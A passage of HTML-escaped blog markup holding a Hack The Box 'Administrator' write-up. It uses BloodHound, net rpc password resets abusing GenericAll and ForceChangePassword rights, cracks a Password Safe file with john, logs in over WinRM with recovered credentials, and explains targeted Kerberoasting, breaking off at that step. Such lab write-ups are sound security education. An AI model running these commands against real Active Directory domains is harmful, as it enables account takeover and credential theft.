+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Message&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;signing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;required&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;share&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nmap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;detection&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;performed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Please&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;report&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;any&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;incorrect&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nmap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Apr  2 12:10:51 2025 -- 1 IP address (1 host up) scanned in 75.49 seconds&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;From the scan, I find various services running, including FTP (port 21), DNS (port 53), Kerberos (port 88), SMB (ports 135, 139, 445), and WINRM (port 5985), among others. If I use Olivia&amp;rsquo;s credentials, I can access the machine with WinRM, but there will not be any information on the machine that leads to a possible privilege escalation path. As I mentioned before, this is a pure AD machine.&lt;/p&gt;
+&lt;h3&gt;Running Bloodhound as Olivia&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;running-bloodhound-as-olivia&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#running-bloodhound-as-olivia&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Since this is an Active Directory environment and I have credentials I run &lt;strong&gt;Bloodhound-python&lt;/strong&gt; to gather information about the domain and find possible lateral movement paths.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bloodhound-python -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;olivia&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;ichliebedich&amp;#39;&lt;/span&gt; -ns 10.10.11.42 -d administrator.htb -c all --zip&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;After uploading the data to Bloodhound, I set Olivia&amp;rsquo;s user as owned and it&amp;rsquo;s possible to see that Olivia has &lt;em&gt;&lt;strong&gt;GenericAll&lt;/strong&gt;&lt;/em&gt; rights over &lt;em&gt;Michael&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin1.png&#34; alt=&#34;Alt text&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Foothold&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;foothold&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;GenericAll over Michael.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;genericall-over-michael&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#genericall-over-michael&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In simple words, &lt;code&gt;GenericAll&lt;/code&gt; rights give full control of the object (user, computer, group, etc.), thus allowing the trustee to manipulate the target however they want. In this case, I am going to use Olivia&amp;rsquo;s credentials to abuse the GenericAll privilege and change Michael&amp;rsquo;s password.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;For more information on GenericAll, please visit &lt;a href=&#34;https://bloodhound.specterops.io/resources/edges/generic-all&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SpectreOps - Generic All&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net rpc password &lt;span class=&#34;s2&#34;&gt;&amp;#34;michael&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wzk123.&amp;#34;&lt;/span&gt; -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;administrator.htb&amp;#34;&lt;/span&gt;/&lt;span class=&#34;s2&#34;&gt;&amp;#34;olivia&amp;#34;&lt;/span&gt;%&lt;span class=&#34;s2&#34;&gt;&amp;#34;ichliebedich&amp;#34;&lt;/span&gt; -S &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.11.42&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Verify the password did change:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin2.png&#34; alt=&#34;Alt text&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;ForceChangePassword over Benjamin.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;forcechangepassword-over-benjamin&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#forcechangepassword-over-benjamin&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;I mark Michael as owned in Bloodhound and invetigating the user I notice he has &lt;code&gt;ForceChangePassword&lt;/code&gt; rights over Benjamin.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;For more information on ForceChangePassword, please visit &lt;a href=&#34;https://bloodhound.specterops.io/resources/edges/force-change-password&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SpectreOps - ForceChangePassword&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin3.png&#34; alt=&#34;Alt text&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This privilege as its name establishes it, allows to &lt;em&gt;reset the password&lt;/em&gt; of the target user without knowing the current password of that user.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net rpc password &lt;span class=&#34;s2&#34;&gt;&amp;#34;benjamin&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wzk123.&amp;#34;&lt;/span&gt; -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;administrator&amp;#34;&lt;/span&gt;/&lt;span class=&#34;s2&#34;&gt;&amp;#34;michael&amp;#34;&lt;/span&gt;%&lt;span class=&#34;s2&#34;&gt;&amp;#34;wzk123.&amp;#34;&lt;/span&gt; -S &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.11.42&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Verify the password did change:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin4.png&#34; alt=&#34;Alt text&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;FTP Access.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;ftp-access&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ftp-access&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;From the previous enumeration, we noted that FTP does not accept anonymous login. Since Bloodhound did not show more &amp;ldquo;options&amp;rdquo; to move laterally I decided to check the open services with the two new users I got.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp 10.10.11.42
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#user: benjamin&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#pass: wzk123.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Using the new credentials that I set on Benjamin I can access the FTP server and I was able to find a &lt;code&gt;.psafe3&lt;/code&gt; file&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin5.png&#34; alt=&#34;FPT share access&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;PasswordSafe3 File.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;passwordsafe3-file&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#passwordsafe3-file&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Extracting &amp;amp; Cracking psafe Hash.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;extracting--cracking-psafe-hash&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#extracting--cracking-psafe-hash&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Psafe3 files are Password Safe 3 files which is a credential manager application similar to KeePass, in this case what is necessary to do is crack the password that is protecting the psafe3 file, for this I will use john to extract/crack the password. With the help of &lt;code&gt;pwsafe2john&lt;/code&gt; I extract the hash of the file in john format, and with john (John the Reaper) I am able to crack its password.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pwsafe2john Backup.psafe3 &amp;gt; Backup_hash&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin6.png&#34; alt=&#34;psafe hash&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Now with the hash file in the correct format, I can crack the psafe3 file password.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john Backup_hash --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin7.png&#34; alt=&#34;john cracked hash&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt; &lt;code&gt;tekieromucho&lt;/code&gt;
+ &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Upon entering the correct password I was able to open the backup file and I can retrieve 3 encrypted passwords.&lt;/p&gt;
+&lt;h3&gt;Checking .psafe3 content.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;checking-psafe3-content&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#checking-psafe3-content&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Download passwordsafe3 for linux &lt;a href=&#34;https://github.com/pwsafe/pwsafe/blob/master/README.LINUX.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin8.png&#34; alt=&#34;open psafe backup&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;&lt;strong&gt;USER&lt;/strong&gt;&lt;/th&gt;
+          &lt;th&gt;&lt;strong&gt;PASSWORD&lt;/strong&gt;&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;emily        &lt;/td&gt;
+          &lt;td&gt;UXLCI5iETUsIBoFVTj8yQFKoHjXmb  &lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;emma          &lt;/td&gt;
+          &lt;td&gt;WwANQWnmJnGV07WQN8bMS7FMAbjNur&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;alexander&lt;br&gt;&lt;/td&gt;
+          &lt;td&gt;UrkIbagoxMyUGw0aPlj9B0AXSea4Sw&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;I got valid credentials with Emily.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec winrm 10.10.11.42 -u emily  -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb  &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;I log in to &lt;em&gt;winrm&lt;/em&gt; using Emily&amp;rsquo;s credentials and I get the user.txt flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin9.png&#34; alt=&#34;pass.txt&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Targeted Kerberoast&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;targeted-kerberoast&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#targeted-kerberoast&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Using &lt;em&gt;bloodHound&lt;/em&gt; I mark Emily as &amp;ldquo;owned&amp;rdquo; and I can see that emily has the ability to perform a TargeterKerberoast
+attack to &lt;strong&gt;Ethan&lt;/strong&gt;.
+&lt;img src=&#34;http://localhost:1313/assets/images/HTB/Administrator/Admin10.png&#34; alt=&#34;Emily Bloodhound&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4&gt;What is a targeted Kerberoast attack?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;what-is-a-targeted-kerberoast-attack&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#what-is-a-targeted-kerberoast-attack&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Targeted Keberoasting attack is a technique that allows an attacker (with a vulnerable/owned account) that has a &lt;strong&gt;GenericAll, GenericWrite, WriteProperty or Validated-SPN permissions&lt;/strong&gt; over another object to control multiple attributes of the attacked object such as SPN&amp;rsquo;s.&lt;/p&gt;
+&lt;p&gt;Adding a &lt;em&gt;non-existent&lt;/em&gt; SPN to the user will allow the attacker to request a &lt;em&gt;service ticket (ST)&lt;/em&gt; for the targeted account and from here it will be as a regular kerberoast attack. Requesting the new SPN will give us back a hash containing the user password.&lt;/p&gt;
+&lt;p&gt;In simple words, the attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to regular a Kerberoasting attack.&lt;/p&gt;
+&lt;h3&gt;Performing The Attack.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;performing-the-attack&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#performing-the-attack&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;I attempt to attach a non-existent SPN to Emily with &lt;em&gt;targetedKerberoast.py.&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
